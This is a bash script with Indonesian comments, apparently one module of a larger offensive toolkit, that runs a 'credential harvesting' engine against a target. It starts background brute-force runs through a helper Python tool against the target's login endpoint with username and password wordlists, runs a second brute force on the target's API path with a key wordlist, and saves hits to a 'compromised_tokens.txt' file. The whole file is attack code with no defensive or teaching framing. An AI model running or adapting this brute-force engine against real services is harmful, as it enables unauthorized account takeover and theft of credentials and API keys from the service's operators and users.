#!/bin/bash

# Credential harvesting dan brute force engine

start_bruteforce() {
    local duration=$1
    
    log_info "Initializing credential harvesting..."
    
    # Cek endpoint login
    local login_url="${TARGET_URL}/auth/login"
    local api_url="${TARGET_URL}/api/application"
    
    # Gunakan wordlist dari konfigurasi
    local username_list="$CONFIG_DIR/wordlists/usernames.txt"
    local password_list="$CONFIG_DIR/wordlists/passwords.txt"
    local api_keys="$CONFIG_DIR/wordlists/api_keys.txt"
    
    # Jalankan brute force login
    if [[ -f "$username_list" && -f "$password_list" ]]; then
        log_info "Starting credential brute force on $login_url"
        python3 "$TOOLS_DIR/api_bruteforce.py" \
            --type login \
            --url "$login_url" \
            --username-list "$username_list" \
            --password-list "$password_list" \
            --duration "$duration" \
            --output "$OUTPUTS_DIR/compromised_tokens.txt" &
        BRUTE_PID=$!
    fi
    
    # Jalankan brute force API key
    if [[ -f "$api_keys" ]]; then
        log_info "Starting API key brute force"
        python3 "$TOOLS_DIR/api_bruteforce.py" \
            --type api \
            --url "$api_url" \
            --key-list "$api_keys" \
            --duration "$duration" \
            --output "$OUTPUTS_DIR/compromised_tokens.txt" &
        API_PID=$!
    fi
    
    wait $BRUTE_PID $API_PID 2>/dev/null || true
    
    log_success "Credential harvesting completed"
}
